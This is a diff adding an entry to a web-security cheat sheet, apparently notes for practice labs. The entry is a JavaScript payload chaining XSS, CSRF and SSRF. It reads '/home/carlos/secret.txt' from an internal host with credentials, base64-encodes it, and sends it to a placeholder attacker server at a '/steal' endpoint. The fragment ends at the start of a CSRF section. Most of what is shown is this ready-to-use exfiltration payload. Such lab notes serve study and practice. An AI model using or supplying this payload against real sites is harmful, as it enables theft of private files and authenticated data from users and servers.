@@ -43,6 +43,26 @@
 
 #### Cheat Sheet
 
+XSS  + CSRF + SSRF  TO READ /home/carlos/secret-txt
+
+```js
+var domain = "http://<IP>/home/carlos/secret.txt";
+var ourDomain = "http://<OUR-SERVER>";
+
+var req = new XMLHttpRequest();
+req.withCredentials = true;
+req.open('GET', domain, false);
+req.send();
+
+var response = req.responseText;
+
+var req2 = new XMLHttpRequest();
+req2.withCredentials = true;
+req2.open('GET', ourDomain + "/steal?data=" + btoa(response), false);
+req2.send();
+```
+
+
 ```html
 
 // CSRF NO DEFENSES  / TRY WITH GET INSTEAD POST
